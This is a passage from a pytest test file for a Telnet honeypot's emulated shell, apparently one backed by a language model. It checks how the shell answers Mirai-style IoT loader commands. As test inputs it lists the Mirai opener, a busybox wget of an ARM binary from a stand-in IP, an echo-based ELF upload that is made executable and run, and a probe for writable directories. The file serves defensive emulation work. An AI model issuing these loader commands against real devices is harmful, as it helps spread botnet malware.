"""The deterministic shell against what IoT loaders send: the Mirai-family opener, command
lists with short-circuit, busybox applets and their usage, the ELF image of a program file
read every way a loader reads one, scratch files within a session, the bytes the Telnet
listener puts on the wire, the event log and the console's view of empty replies."""

from __future__ import annotations

import asyncio
import json
import re
import struct
import time

import pytest

from agents import busybox_text, elfimage, hooks, shell
from agents.budget import Budget, BudgetConfig
from listeners import telnet
from listeners.base import Conn, ListenerContext, ServiceSettings
from listeners.events import EventWriter, clean
from scenarios.schema import Hardware, LoginPolicy

NOW = 1_795_000_000.0
UBUNTU_24 = ("Linux app01 6.8.0-45-generic #45-Ubuntu SMP PREEMPT_DYNAMIC Fri Aug 30 12:02:04 "
             "UTC 2024 {m} {m} {m} GNU/Linux")


def host(machine: str = "x86_64", os_name: str = "Ubuntu 24.04.1 LTS") -> shell.Host:
    return shell.Host(hostname="app01", kernel=UBUNTU_24.format(m=machine),
                      os_pretty_name=os_name, seed="fixture-seed",
                      hardware=Hardware(cpus=2, memory_mb=2048))


def run(lines, h=None, session=None, **kw):
    """Each line's reply from one canned-shell session, as root in /root."""
    h = h or host()
    session = session if session is not None else shell.Session()
    kw.setdefault("now", NOW)
    return [shell.reply(h, line, user="root", interactive=True, cwd="/root", session=session,
                        **kw) for line in lines]


def one(line, h=None, **kw):
    return run([line], h, **kw)[0]


def wire(text: str) -> bytes:
    return shell.wire(text)


def image(h: shell.Host, program: str) -> bytes:
    return elfimage.image(h.machine, h.rng("elf", program))


@pytest.fixture(autouse=True)
def reset_hooks():
    hooks.reset()
    yield
    hooks.reset()


# ---- common opening commands, one by one ----------------------------------------------------

def test_openers_bash_does_not_know_are_command_not_found():
    assert one("sh") == ""
    for word in ("shell", "system", "linuxshell"):
        assert one(word) == f"-bash: {word}: command not found\n"
    # enable stays bash's builtin listing
    assert one("enable").startswith("enable .\nenable :\n")


def test_ping_and_nc_without_arguments_print_their_usage():
    assert one("ping") == "ping: usage error: Destination address required\n"
    assert one("nc").startswith("usage: nc [-46CDdFhklNnrStUuvZz] [-I length]")
    rocky = host(os_name="Rocky Linux 9.4 (Blue Onyx)")
    assert one("nc", rocky) == "Ncat: You must specify a host to connect to. QUITTING.\n"
    a = shell.answer(host(), "ping", now=NOW)
    assert a.status == 1 and a.scope == shell.FIXED


def test_a_semicolon_glued_to_a_word_ends_it():
    assert one("ping; sh") == "ping: usage error: Destination address required\n"
    assert one("ping;sh") == one("ping; sh")
    assert one("frobnicate;sh") == "-bash: frobnicate: command not found\n"


def test_busybox_cat_of_its_own_exe_or_cat():
    h = host()
    out = wire(one("/bin/busybox cat /proc/self/exe || cat /proc/self/exe", h))
    assert out == image(h, "busybox")           # || stops after busybox succeeds
    assert out.count(b"\x7fELF") == 1


@pytest.mark.parametrize("line,program", [("cat /proc/self/exe", "cat"),
                                          ("cat /bin/echo", "echo"),
                                          ("cat /bin/busybox", "busybox"),
                                          ("cat /usr/bin/echo", "echo")])
def test_program_files_read_as_an_elf_image_for_the_host(line, program):
    h = host()
    out = wire(one(line, h))
    assert out == image(h, program)
    assert out[:4] == b"\x7fELF" and out[4] == 2 and out[5] == 1
    assert struct.unpack_from("<H", out, 18)[0] == 62


@pytest.mark.parametrize("machine,em,cls", [("x86_64", 62, 2), ("aarch64", 183, 2),
                                            ("i686", 3, 1), ("armv7l", 40, 1)])
def test_the_machine_field_follows_uname_m(machine, em, cls):
    h = host(machine)
    assert one("uname -m", h) == machine + "\n"
    out = wire(one("cat /bin/echo", h))
    assert out[4] == cls and out[5] == 1 and struct.unpack_from("<H", out, 18)[0] == em
    # the header has nothing a terminal or Telnet would rewrite
    header = out[:64 if cls == 2 else 52]
    assert not set(header) & {0x0A, 0x0D, 0xFF}


def test_every_way_of_reading_a_program_file_agrees():
    h = host()
    full = wire(one("cat /bin/echo", h))
    assert wire(one("/bin/busybox cat /bin/echo", h)) == full
    dd = wire(one("dd if=/bin/echo 2>/dev/null", h))
    assert dd == full
    assert wire(one("dd bs=52 count=1 if=/bin/echo 2>/dev/null", h)) == full[:52]
    assert wire(one("dd if=/bin/echo bs=4 skip=4 count=1 2>/dev/null", h)) == full[16:20]
    # the read loop: NULs dropped, lines split at 0x0a, words joined by one space
    looped = wire(one("while read -r i; do echo $i; done < /bin/echo", h))
    assert looped.startswith(b"\x7fELF\x02\x01\x01\x03>")
    lines = [line.replace(b"\x00", b"") for line in full.split(b"\n")[:-1]]
    assert looped == b"".join(b" ".join(w for w in re.split(rb"[ \t]+", line) if w) + b"\n"
                              for line in lines)
    assert wire(one("while read i; do echo $i; done < /bin/echo", h)).startswith(
        b"\x7fELF\x02\x01\x01\x03>")


def test_the_read_loop_follows_bash_read_and_echo():
    session = shell.Session()
    out = run(["echo -ne 'a\\x00b\\\\c  d\\x0b e\\n-n x\\nlast' > /tmp/r",
               "while read i; do echo $i; done < /tmp/r",
               "while read -r i; do echo $i; done < /tmp/r"], session=session)
    assert out[1] == "abc d\x0b e\nx"                  # -n read as echo's option
    assert out[2] == "ab\\c d\x0b e\nx"


def test_busybox_wget_tftp_and_a_marker():
    out = one("/bin/busybox wget; /bin/busybox tftp; /bin/busybox ECCHI")
    version = host().busybox
    assert out.startswith(f"BusyBox v{version} multi-call binary.\n\nUsage: wget [-cqS]")
    assert f"BusyBox v{version} multi-call binary.\n\nUsage: tftp [OPTIONS] HOST [PORT]" in out
    assert out.endswith("ECCHI: applet not found\n")


def test_the_scratch_file_sequence_is_silent_and_remembered():
    session = shell.Session()
    out = run(["cd /tmp; /bin/busybox cp /bin/echo x; >x; chmod 777 x", "pwd", "ls -l x",
               "cat x", "./x"], session=session)
    assert out[0] == "" and out[1] == "/tmp\n"
    assert re.fullmatch(r"-rwxrwxrwx 1 root root 0 \w{3} [ \d]\d \d\d:\d\d x\n", out[2])
    assert out[3] == "" and out[4] == ""            # an empty file runs as an empty script
    entry = session.files["/tmp/x"]
    assert entry.data == "" and entry.mode == 0o777 and session.cwd == "/tmp"


def test_dd_of_a_binary_or_cat_prints_the_header_then_the_counts():
    h = host()
    out = one("/bin/busybox dd bs=52 count=1 if=/bin/echo || cat /bin/echo", h)
    assert wire(out) == image(h, "echo")[:52] + b"1+0 records in\n1+0 records out\n"
    gnu = one("dd bs=52 count=1 if=/bin/echo", h)
    assert re.fullmatch(r"1\+0 records in\n1\+0 records out\n52 bytes copied, "
                        r"[0-9.e-]+ s, [0-9.]+ [kMG]?B/s\n", gnu[52:])
    assert run(["touch /tmp/gone; rm /tmp/gone", "dd if=/tmp/gone bs=52 count=1"], h)[1] == \
        "dd: failed to open '/tmp/gone': No such file or directory\n"


def test_rm_then_echo_keeps_the_echo():
    assert one("rm -rf x; echo done") == "done\n"
    assert run(["cd /tmp; touch x", "rm -rf x; echo done", "cat x"]) == \
        ["", "done\n", "cat: x: No such file or directory\n"]


def test_the_read_loop_over_proc_self_exe_is_the_shells_image():
    h = host()
    out = wire(one("while read i; do echo $i; done < /proc/self/exe", h))
    assert out.startswith(b"\x7fELF\x02\x01\x01\x03>")
    assert out != wire(one("while read i; do echo $i; done < /bin/echo", h))


def test_ls_of_the_bin_dirs_agrees_with_the_commands():
    h = host()
    listing = one("ls -1 /bin", h).split()
    assert one("ls -1 /usr/bin", h).split() == listing
    for name in ("busybox", "cat", "echo", "wget", "ping", "nc", "dd", "cp", "chmod", "uname",
                 "lspci", "curl"):
        assert name in listing, name
    for name in ("shell", "system", "linuxshell", "nvidia-smi", "killall"):
        assert name not in listing, name
    assert "sshd" in one("ls -1 /sbin", h).split()
    assert "useradd" in one("ls -1 /usr/sbin", h).split()
    rhel = host(os_name="Rocky Linux 9.4 (Blue Onyx)")
    assert "busybox" not in one("ls -1 /bin", rhel).split()
    assert one("/bin/busybox", rhel) == "-bash: /bin/busybox: No such file or directory\n"


# ---- command lists and short-circuit ----------------------------------------------------------

@pytest.mark.parametrize("line,expected", [
    ("true && echo a || echo b", "a\n"),
    ("false && echo a || echo b", "b\n"),
    ("false || false || echo c", "c\n"),
    ("true || echo a; echo b", "b\n"),
    ("false && echo a; echo b", "b\n"),
    ("frobnicate && echo a", "-bash: frobnicate: command not found\n"),
    ("frobnicate || echo a", "-bash: frobnicate: command not found\na\n"),
    ("cat /tmp/nope || echo fallback", "cat: /tmp/nope: No such file or directory\nfallback\n"),
    ("/bin/busybox ECCHI || echo x", "ECCHI: applet not found\nx\n"),
])
def test_short_circuit_follows_exit_status(line, expected):
    assert one(line) == expected


def test_a_part_we_cannot_evaluate_does_not_lose_the_rest():
    # answer() still refuses the whole line (the model path); reply() answers part by part
    assert shell.answer(host(), "uname -m; frobnicate; uname -s", now=NOW) is None
    assert one("uname -m; frobnicate; uname -s") == \
        "x86_64\n-bash: frobnicate: command not found\nLinux\n"
    assert one("ls --color /tmp; echo after") == "after\n"
    assert one("ls /tmp/*; echo after") == ""      # a glob: the whole line needs a shell


def test_answer_scopes_for_the_model_path():
    h = host()
    for line in ("cat /proc/self/exe", "cat /bin/echo", "/bin/busybox ECCHI", "ping", "nc",
                 "dd bs=52 count=1 if=/bin/echo"):
        assert shell.answer(h, line, now=NOW).scope == shell.FIXED, line
    for line in ("cd /tmp; >x", "cp /bin/echo /tmp/x", "echo -ne '\\x41' >> /tmp/x"):
        assert shell.answer(h, line, now=NOW).scope == shell.STATE, line


# ---- busybox ----------------------------------------------------------------------------------

USAGE_APPLETS = ("wget", "tftp", "cp", "chmod", "rm", "mkdir", "mv", "touch", "printf", "nc",
                 "ftpget", "ftpput")


@pytest.mark.parametrize("os_name,generation", [("Ubuntu 22.04.4 LTS", "1.30"),
                                                ("Ubuntu 24.04.1 LTS", "1.36"),
                                                ("Debian GNU/Linux 12 (bookworm)", "1.35")])
def test_busybox_applets_print_the_packages_usage(os_name, generation):
    h = host(os_name=os_name)
    for applet in USAGE_APPLETS:
        a = shell.answer(h, f"/bin/busybox {applet}", now=NOW)
        assert a.status == 1, applet
        assert a.output == (f"BusyBox v{h.busybox} multi-call binary.\n\n"
                            + busybox_text.USAGE[generation][applet]), applet
    assert one("/bin/busybox echo", h) == "\n"
    for applet in ("kill", "killall"):
        a = shell.answer(h, f"/bin/busybox {applet}", now=NOW)
        assert (a.output, a.status) == (f"{applet}: you need to specify whom to kill\n", 1)
    listed = one("/bin/busybox --list", h).split()
    assert listed == sorted(busybox_text.APPLETS[generation])
    # what busybox runs here is what that package has
    for applet in shell._APPLETS:
        assert applet in busybox_text.APPLETS[generation], applet
    assert one("/bin/busybox cd /tmp", h) == "cd: applet not found\n"
    assert one("/bin/busybox MIRAI", h) == "MIRAI: applet not found\n"


def test_gnu_tools_without_operands_say_what_is_missing():
    assert one("cp") == "cp: missing file operand\nTry 'cp --help' for more information.\n"
    assert one("cp x") == ("cp: missing destination file operand after 'x'\n"
                           "Try 'cp --help' for more information.\n")
    assert one("rm") == "rm: missing operand\nTry 'rm --help' for more information.\n"
    assert one("rm -f") == ""
    assert one("chmod 777") == ("chmod: missing operand after ‘777’\n"
                                "Try 'chmod --help' for more information.\n")
    assert one("kill") == ("kill: usage: kill [-s sigspec | -n signum | -sigspec] pid | "
                           "jobspec ... or kill -l [sigspec]\n")
    assert one("printf") == "printf: usage: printf [-v var] format [arguments]\n"
    assert one("printf 'a%sb\\n' x") == "axb\n"


def test_busybox_wget_with_a_url_uses_busybox_wording():
    assert one("/bin/busybox wget http://203.0.113.5/bins/x.arm7 -O - > x") == (
        "Connecting to 203.0.113.5:80 (203.0.113.5:80)\n"
        "wget: can't connect to remote host (203.0.113.5): Network is unreachable\n")
    assert one("busybox wget http://bad.example/x") == "wget: bad address 'bad.example'\n"


# ---- scratch files ----------------------------------------------------------------------------

def test_an_echo_upload_is_kept_byte_for_byte_and_executes_as_the_kernel_would():
    session = shell.Session()
    arm = "\\x7f\\x45\\x4c\\x46\\x01\\x01\\x01\\x00" + "\\x00" * 8 + "\\x02\\x00\\x28\\x00"
    out = run(["cd /tmp", f"echo -ne '{arm}' > dvrHelper", "echo -ne '\\xff\\x80' >> dvrHelper",
               "chmod 777 dvrHelper", "./dvrHelper", "ls -la"], session=session)
    data = wire(session.files["/tmp/dvrHelper"].data)
    assert data == b"\x7fELF\x01\x01\x01\x00" + bytes(8) + b"\x02\x00\x28\x00\xff\x80"
    assert out[4] == "-bash: ./dvrHelper: cannot execute binary file: Exec format error\n"
    assert re.search(r"\n-rwxrwxrwx +1 root root +22 \w{3} [ \d]\d \d\d:\d\d dvrHelper\n", out[5])
    assert out[5].startswith("total ") and " .\n" in out[5] and " .X11-unix\n" in out[5]


def test_a_program_for_this_machine_is_never_run():
    h = host()
    session = shell.Session()
    header = "".join(f"\\x{b:02x}" for b in image(h, "echo")[:20])
    out = run([f"echo -ne '{header}' > /tmp/d", "chmod +x /tmp/d", "/tmp/d; echo next"],
              h, session)
    assert out[2] == "next\n"


def test_a_copied_program_answers_as_that_program():
    out = run(["cp /bin/echo /tmp/e", "/tmp/e hello", "chmod 644 /tmp/e", "/tmp/e"])
    assert out[1] == "hello\n" and out[3] == "-bash: /tmp/e: Permission denied\n"


def test_mkdir_mv_touch_and_cd_stay_consistent():
    out = run(["mkdir /tmp/.d", "cd /tmp/.d", "touch a", "mv a b", "ls", "mkdir /tmp/.d",
               "cd /", "rm /tmp/.d", "rm -r /tmp/.d; ls -a /tmp/.d"])
    assert out[:4] == ["", "", "", ""] and out[4] == "b\n"
    assert out[5] == "mkdir: cannot create directory ‘/tmp/.d’: File exists\n"
    assert out[7] == "rm: cannot remove '/tmp/.d': Is a directory\n"
    assert out[8] == "ls: cannot access '/tmp/.d': No such file or directory\n"


def test_files_are_only_made_where_a_listing_is_known():
    assert shell.answer(host(), "echo x > /etc/motd", now=NOW) is None
    assert shell.answer(host(), "cp /bin/echo /etc/x", now=NOW) is None
    assert shell.answer(host(), "rm /etc/passwd", now=NOW) is None
    a = shell.answer(host(), "echo x > /tmp/f", user="alice", now=NOW)
    assert a is not None and a.output == ""
    denied = shell.answer(host(), "echo x > /opt/f", user="alice", now=NOW)
    assert denied.output == "-bash: /opt/f: Permission denied\n" and denied.status == 1


def test_echo_to_the_terminal_still_drops_control_bytes():
    assert one("echo -e 'a\\x07b\\x1bc'") == "abc\n"


# ---- budgets ----------------------------------------------------------------------------------

def test_a_hostile_long_list_stays_within_the_budget():
    h = host()
    started = time.perf_counter()
    assert one("a;" * 2000, h) == "-bash: a: command not found\n"       # over MAX_LIST
    out = one(";".join(["a"] * shell.MAX_LIST), h)
    assert out == "-bash: a: command not found\n" * shell.MAX_LIST
    heavy = host()
    heavy.hardware = Hardware(cpus=64, memory_mb=2048)
    line = "; ".join(["cat /proc/cpuinfo"] * shell.MAX_LIST)
    assert shell.answer(heavy, line, now=NOW) is None                  # MAX_OUTPUT
    assert len(one(line, heavy)) < shell.MAX_OUTPUT
    session = shell.Session()
    run(["echo -ne '" + "a b\\n" * 200 + "' >> /tmp/big"] * 170, h, session)
    assert 100_000 < session.size() <= shell.MAX_SCRATCH_BYTES
    loops = "; ".join(["while read i; do echo $i; done < /tmp/big"] * 4)
    assert shell.Shell(h, "root", True, "/root", NOW, None, session).run(loops) is None
    assert one(loops, h, session=session) == ""                         # MAX_WORK
    assert time.perf_counter() - started < 2.0


def test_session_files_are_bounded():
    session = shell.Session()
    run([f"touch /tmp/f{n}" for n in range(shell.MAX_SCRATCH + 10)], session=session)
    assert len(session.files) == shell.MAX_SCRATCH
    chunk = "\\x41" * 1000
    run([f"echo -ne '{chunk}' >> /tmp/f0"] * 400, session=session)
    assert session.size() <= shell.MAX_SCRATCH_BYTES
    run([f"rm /tmp/f{n}; touch /tmp/g{n}; rm /tmp/g{n}" for n in range(100)], session=session)
    assert len(session.removed) <= shell.MAX_SCRATCH


# ---- bytes on the wire and in the log ---------------------------------------------------------

def test_printable_and_wire():
    text = shell.binary_text(b"\x7fELF\x02\xff\x80ok\r\n\t")
    assert wire(text) == b"\x7fELF\x02\xff\x80ok\r\n\t"
    assert shell.printable(text) == "\\x7fELF\\x02\\xff\\x80ok\r\n\t"
    assert shell.printable("plain é text") == "plain é text"


class FakeWriter:
    """A connection's writer: keeps every write as sent."""

    def __init__(self) -> None:
        self.writes: list[bytes] = []

    def write(self, data: bytes) -> None:
        self.writes.append(bytes(data))

    async def drain(self) -> None:
        return None

    def get_extra_info(self, name):
        return {"peername": ("203.0.113.7", 40000), "sockname": ("192.0.2.1", 23)}.get(name)

    def close(self) -> None:
        return None


MIRAI_OPENER = [
    "enable", "system", "shell", "sh", "linuxshell", "ping; sh",
    "/bin/busybox ECCHI",
    "/bin/busybox ps; /bin/busybox ECCHI",
    "/bin/busybox cat /proc/mounts; /bin/busybox ECCHI",
    "/bin/busybox echo -e '\\x6b\\x61\\x6d\\x69' > /tmp/.nippon; /bin/busybox cat /tmp/.nippon; "
    "/bin/busybox rm /tmp/.nippon",
    "cd /tmp/; /bin/busybox cp /bin/echo dvrHelper; >dvrHelper; /bin/busybox chmod 777 "
    "dvrHelper; /bin/busybox ECCHI",
    "/bin/busybox cat /proc/self/exe || cat /proc/self/exe",
    "/bin/busybox dd bs=52 count=1 if=/bin/echo || while read i; do echo $i; done < /bin/echo",
    "cat /bin/echo",
    "/bin/busybox wget; /bin/busybox tftp; /bin/busybox ECCHI",
]


async def test_the_mirai_opener_end_to_end_through_the_telnet_listener():
    events = EventWriter(None)
    ctx = ListenerContext(events, bind_host="127.0.0.1", seed="test")
    ctx.settings["telnet"] = ServiceSettings(name="telnet", enabled=True, port=0,
                                             policy=LoginPolicy(accept="all"))
    reader = asyncio.StreamReader()
    reader.feed_data("".join(line + "\r\n" for line in MIRAI_OPENER).encode())
    reader.feed_eof()
    writer = FakeWriter()
    conn = Conn(ctx, "telnet", reader, writer)
    try:
        await telnet._canned_session(conn, telnet.TelnetReader(conn), "root")
    except Exception as exc:                       # the fake connection ends with EOF
        assert type(exc).__name__ == "ConnClosed"
    h = shell.host_for(None, "test")
    sent = writer.writes
    at = [i for i, w in enumerate(sent) if w.startswith(b"root@srv01:")]
    prompts = [sent[i] for i in at]
    replies = [sent[i + 1] for i in at[:-1]]
    assert len(replies) == len(MIRAI_OPENER)
    assert replies[1] == b"-bash: system: command not found\r\n"
    assert replies[3] == b""
    assert replies[5] == b"ping: usage error: Destination address required\r\n"
    assert replies[6] == b"ECCHI: applet not found\r\n"
    assert replies[9] == b"kami\r\n"
    assert replies[10] == b"ECCHI: applet not found\r\n"
    assert prompts[11] == b"root@srv01:/tmp# "           # the session moved to /tmp

    def as_telnet(data: bytes) -> bytes:                # ONLCR, then IAC doubled
        return data.replace(b"\n", b"\r\n").replace(b"\xff", b"\xff\xff")

    busybox = image(h, "busybox")
    assert replies[11] == as_telnet(busybox)
    assert replies[11][:4] == b"\x7fELF" and replies[11][18:20] == b"\x3e\x00"
    echo = image(h, "echo")
    assert replies[12] == echo[:52] + b"1+0 records in\r\n1+0 records out\r\n"
    assert replies[13] == as_telnet(echo)
    assert b"\xff\xff" in replies[13] or b"\xff" not in echo
    assert replies[14].endswith(b"ECCHI: applet not found\r\n")
    # the event log keeps printable text, capped as before
    logged = [e for e in events.events if e["event"] == "command"]
    assert [e["data"]["input"] for e in logged] == [clean(line) for line in MIRAI_OPENER]
    for e in logged:
        response = e["data"]["response"]
        assert all(c.isprintable() or c in "\r\n\t" for c in response)
        assert len(response) <= telnet.RESPONSE_LOG_CAP
        json.dumps(e).encode("utf-8")
    assert logged[3]["data"]["response"] == ""
    # binary bytes are logged as \xNN text, which the log's own escaping writes as \\xNN
    response = logged[11]["data"]["response"]
    assert response.startswith("\\\\x7fELF\\\\x02\\\\x01\\\\x01")
    from agents.ui.activity import describe

    shown = describe({"event": "command", "data": logged[11]["data"]}, "telnet", "input", 4000)
    assert shown["answered"].startswith("\\x7fELF\\x02\\x01\\x01\\x00")


async def test_a_binary_answer_on_the_model_path_keeps_history_text():
    """A local answer that holds binary bytes goes out as bytes, and what the model is shown
    later is printable text."""
    from langchain_core.chat_history import InMemoryChatMessageHistory

    class History:
        def __init__(self):
            self.store = {}
            self.calls = []

        def get_session_history(self, sid):
            return self.store.setdefault(sid, InMemoryChatMessageHistory())

        async def ainvoke(self, payload, config=None):
            self.calls.append(payload["messages"][-1].content)
            return type("R", (), {"content": "ok\r\nroot@srv01:~# "})()

    hooks.set_budget(Budget(BudgetConfig()))
    history = History()
    r = await hooks.persona_invoke(history, session_id="s1", src_ip="203.0.113.9",
                                   username="root", text="cat /proc/self/exe", interactive=True,
                                   llm_config={"configurable": {"session_id": "s1"}})
    assert getattr(r, "local_reply", False) and wire(r.content).startswith(b"\x7fELF")
    kept = history.store["s1"].messages[1].content
    assert kept.startswith("\\x7fELF") and kept.encode("utf-8")
    assert hooks.clip_input("a\udcffb") == "a?b"


# ---- the console: empty reply, no reply, line endings ------------------------------------------

def test_activity_tells_an_empty_reply_from_none_and_shows_line_breaks():
    from agents.ui.activity import describe

    def telnet_line(data):
        return {"event": "command", "sensor_protocol": "telnet",
                "data": {k: clean(v) for k, v in data.items()}}

    empty = describe(telnet_line({"input": "sh", "response": ""}), "telnet", "input", 4000)
    assert empty["answered"] == "" and empty["sent"] == "sh"
    none = describe(telnet_line({"input": "uname"}), "telnet", "input", 4000)
    assert none["answered"] is None
    blank = describe(telnet_line({"input": "", "response": ""}), "telnet", "input", 4000)
    assert blank["sent"] == "" and blank["answered"] == ""
    crlf = describe(telnet_line({"input": "x", "response": "kami\r\nroot\\x0a\r\n"}),
                    "telnet", "input", 4000)
    # line endings become line breaks; a backslash the reply held stays text
    assert crlf["answered"] == "kami\nroot\\x0a\n"
    binary = describe(telnet_line({"input": "x", "response": telnet._logged(
        shell.binary_text(b"\x7fELF\x01\r\n"))}), "telnet", "input", 4000)
    assert binary["answered"] == "\\x7fELF\\x01\n"


def test_console_item_keeps_the_empty_reply(tmp_path):
    from ui_fixture import build_tree

    from agents.ui.api import Api

    tree = build_tree(tmp_path / "tree")
    lines = [{"timestamp": "2026-11-18T09:00:00.000+00:00", "task_name": "telnet-e",
              "src_ip": "198.51.100.30", "src_port": 4, "dst_ip": "10.0.0.5", "dst_port": 23,
              "message": "Telnet input", "sensor_protocol": "telnet", "event": "command",
              "transport": "tcp", "data": data}
             for data in ({"input": "sh", "response": ""}, {"input": "uname"},
                          {"input": "", "response": ""},
                          {"input": "id", "response": clean("uid=0(root)\r\n")})]
    with open(tree.log, "w", encoding="utf-8") as f:
        for line in lines:
            f.write(json.dumps(line) + "\n")
    status, body = Api(tree.api_paths(), cache_seconds=0).get(
        "/api/activity", {"session": "telnet-e"})
    assert status == 200
    got = {i["sent"]: i["answered"] for i in body["items"]}
    assert got == {"sh": "", "uname": None, "": "", "id": "uid=0(root)\n"}


def test_event_detail_renders_the_three_cases_as_text_nodes():
    from pathlib import Path

    js = (Path(__file__).resolve().parents[1] / "agents/ui/static/app.js").read_text()
    start = js.index("\n  function eventDetail(")
    body = js[start:js.index("\n  function ", start + 10)]
    assert '"Answered with nothing."' in body
    assert '"No reply is recorded in the log for this event."' in body
    assert '"(empty line)"' in body
    # the empty-reply branch comes before the no-reply one, and only "string" counts
    assert body.index('typeof it.answered === "string") {') < body.index("No reply is recorded")
    assert "innerHTML" not in body and "insertAdjacent" not in body


def test_wc_counts_a_binary_and_ls_l_of_an_empty_directory_is_its_total():
    # wc -c counts the bytes of a binary; ls -l of an empty directory is just its total
    assert one("cat /bin/echo | wc -c") == f"{elfimage.SIZE}\n"
    assert one("ls -l /mnt") == "total 0\n"


def test_redirection_and_file_edge_cases():
    h = host()
    a = shell.answer(h, "echo hi > /tmp/a > /tmp", now=NOW)
    assert a.output == "-bash: /tmp: Is a directory\n" and a.scope == shell.STATE
    assert one("echo hi 1>&2 | wc -c") == "hi\n0\n"
    session = shell.Session()
    run(["echo -ne '\\xde\\xad\\xbe\\xef' | cat > /tmp/p"], session=session)
    assert wire(session.files["/tmp/p"].data) == b"\xde\xad\xbe\xef"
    out = [shell.reply(h, line, user="alice", cwd="/tmp", now=NOW, session=session)
           for line in ("touch /tmp/x", "chmod u+x /tmp/x", "/tmp/x")]
    assert out == ["", "", ""]
    assert run(["cp /bin/echo /usr/local/bin/x", "/usr/local/bin/x hi"])[1] == "hi\n"
    assert run(["echo é > /tmp/u", "dd if=/tmp/u bs=1 count=1 2>/dev/null | wc -c"])[1] == "1\n"
    assert shell.answer(h, "mkdir -p /tmp/a/b/c/d/e/f/g/h/i", now=NOW) is None


# ---- output the shell cannot evaluate still follows its redirections --------------------------

def test_fallback_output_goes_where_its_redirections_point():
    session = shell.Session(cwd="/root")
    assert run(["printf hi > /tmp/x", "cat /tmp/x"], session=session) == ["", "hi"]
    assert run(["printf yo >> /tmp/x", "cat /tmp/x"], session=session) == ["", "hiyo"]
    assert run(["printf a > /dev/null", "printf b >&2", "printf c 2>/dev/null >&2",
                "printf d 2>&1"]) == ["", "b", "", "d"]
    # the missing file's error is the tool's own, sent to /dev/null; the list goes on
    assert one("cat /tmp/nope 2>/dev/null; echo marker") == "marker\n"
    assert one("foo 2>/dev/null; echo marker") == "marker\n"
    assert one("foo > /dev/null 2>&1") == ""
    assert one("foo 2>&1 > /dev/null") == "-bash: foo: command not found\n"
    assert run(["foo 2>/tmp/e", "cat /tmp/e"]) == ["", "-bash: foo: command not found\n"]
    # a target this shell cannot write: the output is not shown instead
    assert one("printf hi > /etc/passwd") == ""


def test_fallback_in_a_pipeline_answers_each_stage_through_its_own_redirections():
    assert one("printf hi | foo") == "-bash: foo: command not found\n"
    assert one("printf hi | foo 2>/dev/null") == ""
    assert one("foo | bar 2>/dev/null") == "-bash: foo: command not found\n"
    assert one("foo | echo hi") == "-bash: foo: command not found\nhi\n"
    # the last stage's status decides && and ||
    assert one("printf hi | foo && echo ok") == "-bash: foo: command not found\n"
    assert one("foo 2>/dev/null | cat || echo no") == ""
    # every stage still opens its files, and output into a pipe is not shown
    session = shell.Session(cwd="/root")
    assert run(["foo 2>/dev/null | cat > /tmp/q", "ls /tmp/q"], session=session) \
        == ["", "/tmp/q\n"]
    assert run(["printf hi > /tmp/p | cat", "cat /tmp/p"], session=session) == ["", "hi"]
    assert one("printf hi 2>&1 | foo 2>/dev/null") == ""
    assert one("foo | cat > /root") == ("-bash: foo: command not found\n"
                                        "-bash: /root: Is a directory\n")


def test_busybox_printf_and_a_read_loop_follow_their_redirections():
    session = shell.Session(cwd="/root")
    assert run(["busybox printf hi > /tmp/y", "cat /tmp/y"], session=session) == ["", "hi"]
    # a read loop with nothing to read cannot be answered, but its file is still made
    assert run(["while read i; do echo $i; done > /tmp/l", "ls /tmp/l"],
               session=session) == ["", "/tmp/l\n"]


def test_a_redirection_error_goes_where_fd_2_points_by_then():
    session = shell.Session(cwd="/root")
    run(["touch /tmp/f", "rm /tmp/f"], session=session)
    assert run(["cat 2>/dev/null < /tmp/f"], session=session) == [""]
    assert run(["cat < /tmp/f 2>/dev/null"], session=session) \
        == ["-bash: /tmp/f: No such file or directory\n"]
    assert run(["echo hi 2>/tmp/e > /root", "cat /tmp/e"], session=session) \
        == ["", "-bash: /root: Is a directory\n"]
    assert one("foo 2>/dev/null > /root") == ""


# ---- a loader's writable-directory probe -------------------------------------------------------

PROBE = ">{d}/.f && chmod 777 {d}/.f && {d}/.f && cd {d}/; "


def test_the_probe_makes_its_file_in_a_system_directory():
    session = shell.Session(cwd="/root")
    assert run([PROBE.format(d="/var"), "ls -la /var/.f"], session=session) \
        == ["", "-rwxrwxrwx 1 root root 0 Nov 18 11:06 /var/.f\n"]
    assert session.cwd == "/var" and "/var/.f" in session.files
    # the file does not stand in for a listing of /var, which this shell does not have
    assert shell.answer(host(), "ls /var", now=NOW, session=session) is None
    assert shell.answer(host(), "ls /var/.g", now=NOW, session=session) is None
    # the kernel's file systems and plain host names stay with the model
    for line in (">/proc/.f", ">/sys/.f", ">/var/cache", ">>/etc/crontab"):
        assert shell.answer(host(), line, now=NOW) is None, line


def test_a_file_made_under_var_run_is_the_same_file_under_run():
    session = shell.Session(cwd="/root")
    assert run([PROBE.format(d="/var/run"), "pwd", "ls -la /run/.f", "rm /run/.f", "cat .f"],
               session=session) \
        == ["", "/var/run\n", "-rwxrwxrwx 1 root root 0 Nov 18 11:06 /run/.f\n", "",
            "cat: .f: No such file or directory\n"]


def test_cd_enters_a_directory_made_under_var_run():
    session = shell.Session(cwd="/root")
    assert run(["cd /var/run", "mkdir .d", "cd .d", "pwd", ">x", "ls /run/.d"], session=session) \
        == ["", "", "", "/var/run/.d\n", "", "x\n"]


def test_a_whole_loader_probe_is_answered_without_the_model():
    session = shell.Session(cwd="/root")
    dirs = ("/var", "/var/tmp", "/var/run", "/dev", "/dev/shm", "/data", "/etc", "/mnt", "/usr",
            "/boot", "/home", "/root")
    replies = run([PROBE.format(d=d) for d in dirs], session=session)
    assert replies == ["-bash: /data/.f: No such file or directory\n" if d == "/data" else ""
                       for d in dirs]


def test_a_redirection_into_a_missing_directory_fails_as_bash_says():
    error = "-bash: /data/.f: No such file or directory\n"
    assert one(">/data/.f") == error
    assert one(">/data/.f || echo failed") == error + "failed\n"
    session = shell.Session(cwd="/root")
    assert run([PROBE.format(d="/data")], session=session) == [error]
    assert session.cwd == "/root" and not session.files
    assert one("echo hi > /nope/x") == "-bash: /nope/x: No such file or directory\n"
    a = shell.answer(host(), ">/data/.f && echo no", now=NOW)
    assert (a.output, a.status) == (error, 1)
    a = shell.answer(host(), ">/data/.f", interactive=False, now=NOW)
    assert a.output == "bash: line 1: /data/.f: No such file or directory\n"


def test_the_probe_with_relative_paths_after_cd():
    session = shell.Session(cwd="/root")
    assert run(["cd /var", ">.f && chmod 777 .f && ./.f && echo ran", "ls -la /var/.f"],
               session=session) == ["", "ran\n", "-rwxrwxrwx 1 root root 0 Nov 18 11:06 "
